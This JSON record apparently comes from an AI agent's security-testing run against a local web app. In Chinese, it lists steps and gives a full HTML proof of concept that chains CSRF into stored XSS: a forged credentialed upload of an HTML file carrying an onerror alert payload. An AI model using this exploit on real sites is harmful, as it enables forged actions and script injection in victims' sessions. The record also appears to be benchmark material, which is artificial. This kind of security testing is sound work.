{
    "success": "yes",
    "exploit": "1. \u4f7f\u7528 `create_csrf_page()` \u521b\u5efa\u4e00\u4e2a\u6076\u610f HTML \u9875\u9762\uff0c\u6a21\u62df\u653b\u51fb\u8005\u7684\u7f51\u9875\u3002\n2. \u4f7f\u7528 `navigate_to_url(\"http://localhost:9600\")` \u8bbf\u95ee\u76ee\u6807\u5e94\u7528\uff0c\u786e\u4fdd\u7528\u6237\u5df2\u767b\u5f55\u3002\n3. \u5728\u65b0\u6807\u7b7e\u9875\u4e2d\u6253\u5f00\u6076\u610f CSRF \u9875\u9762\uff0c\u89e6\u53d1\u4e0a\u4f20\u8bf7\u6c42\u3002\n4. \u4f7f\u7528 `navigate_to_url(\"http://localhost:9600/user_infos/image.html\")` \u8bbf\u95ee\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u9a8c\u8bc1 XSS \u662f\u5426\u88ab\u89e6\u53d1\u3002\n5. \u4f7f\u7528 `check_alert()` \u68c0\u67e5\u662f\u5426\u6709\u5f39\u7a97\uff0c\u786e\u8ba4 XSS \u6210\u529f\u3002\n6. \u4f7f\u7528 `take_screenshot(\"csrf_attack_result.png\")` \u622a\u53d6\u5173\u952e\u6b65\u9aa4\u7684\u8bc1\u636e\u3002",
    "poc": "1. \u521b\u5efa CSRF \u653b\u51fb\u9875\u9762:\n   ```html\n   <!DOCTYPE html>\n   <html>\n     <body>\n       <script>\n         function submitRequest() {\n           var xhr = new XMLHttpRequest();\n           xhr.open(\"POST\", \"http://localhost:9600/upload_avatar\", true);\n           xhr.withCredentials = true;\n           xhr.setRequestHeader(\n             \"Content-Type\",\n             \"multipart/form-data; boundary=---------------------------7469129296923044552541602996\"\n           );\n           var body =\n             \"-----------------------------7469129296923044552541602996\\r\\n\" +\n             \"Content-Disposition: form-data; name=\\\"avatar\\\"; filename=\\\"image.html\\\"\\r\\n\" +\n             \"Content-Type: text/html\\r\\n\" +\n             \"\\r\\n\" +\n             \"<img src=x onerror=alert('CSRF-XSS') />\\r\\n\" +\n             \"-----------------------------7469129296923044552541602996--\\r\\n\";\n           var aBody = new Uint8Array(body.length);\n           for (var i = 0; i < body.length; i++) {\n             aBody[i] = body.charCodeAt(i);\n           }\n           xhr.send(new Blob([aBody]));\n         }\n         submitRequest();\n         window.location.href = \"http://localhost:9600/user_infos/image.html\";\n       </script>\n     </body>\n   </html>\n   ```\n2. \u4f7f\u7528 `create_csrf_page(html_content, \"csrf_attack.html\")` \u521b\u5efa\u9875\u9762\u3002\n3. \u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee `http://localhost:9600`\uff0c\u786e\u4fdd\u7528\u6237\u5df2\u767b\u5f55\u3002\n4. \u4f7f\u7528 `navigate_to_url(\"file://path/to/csrf_attack.html\")` \u6253\u5f00 CSRF \u9875\u9762\u3002\n5. \u4f7f\u7528 `check_alert()` \u9a8c\u8bc1 XSS \u662f\u5426\u89e6\u53d1\u3002\n6. \u4f7f\u7528 `take_screenshot(\"csrf_attack_result.png\")` \u4fdd\u5b58\u7ed3\u679c\u3002",
    "evidence": "- \u622a\u56fe\u8def\u5f84: csrf_attack_result.png\n- alert \u6587\u672c: \"CSRF-XSS\"",
    "time_left": 2682.525103330612
}